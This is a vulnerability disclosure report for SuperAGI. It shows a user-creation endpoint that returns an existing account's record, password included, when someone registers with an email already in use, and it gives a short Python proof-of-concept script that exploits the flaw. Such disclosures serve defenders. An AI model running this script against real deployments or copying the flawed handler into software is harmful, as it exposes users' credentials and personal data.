Leak of user information by register with same email in transformeroptimus/superagi

Valid

Reported on Sep 20th 2024

Description

An attacker can leak information like password, name ... By trying to register a new account with an email already use. The server will return all information of the account with this email.
This is vulnerable endpoint

Vulnerable code :

@router.post("/add", response_model=UserOut, status_code=201)
def create_user(user: UserIn,
                Authorize: AuthJWT = Depends(check_auth)):
  

    db_user = db.session.query(User).filter(User.email == user.email).first()
    if db_user:
        return db_user # => here is the vuln
    db_user = User(name=user.name, email=user.email, password=user.password, organisation_id=user.organisation_id)
    db.session.add(db_user)
    db.session.commit()
    db.session.flush()
    organisation = Organisation.find_or_create_organisation(db.session, db_user)
    Project.find_or_create_default_project(db.session, organisation.id)
    logger.info("User created", db_user)

    ModelsConfig.add_llm_config(db.session, organisation.id)
    
    return db_user

Proof of Concept (PoC):

Here’s the exploit script to demonstrate the issue:

import requests
import json

BASE_URL = "http://localhost:3000/api"

def login(username, password):
    data = {
        "email": username,
        "password": password  
    }
    res = requests.post(BASE_URL+"/login", json=data)
    # print(res.text)
    token = json.loads(res.text)["access_token"]
    return token

def register(token, email):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    data = {
        "name": "idk name",
        "email": email,
        "password": "i_dont_know_password",
        "organisation_id": 1
    }

    response = requests.post(BASE_URL+"/users/add", json=data, headers=headers)
    print(response.text)

Impact

This vulnerability allows attackers to leak sensitive user information, including names, emails, and passwords (if stored improperly) by attempting to register with an existing email. It can lead to:

  • Account Compromise: Attackers may gain unauthorized access if passwords are exposed.
  • Privacy Violations: Personal data exposure could breach privacy regulations (e.g., GDPR, CCPA).
  • Phishing & Targeted Attacks: Exposed information can be used in social engineering attacks.
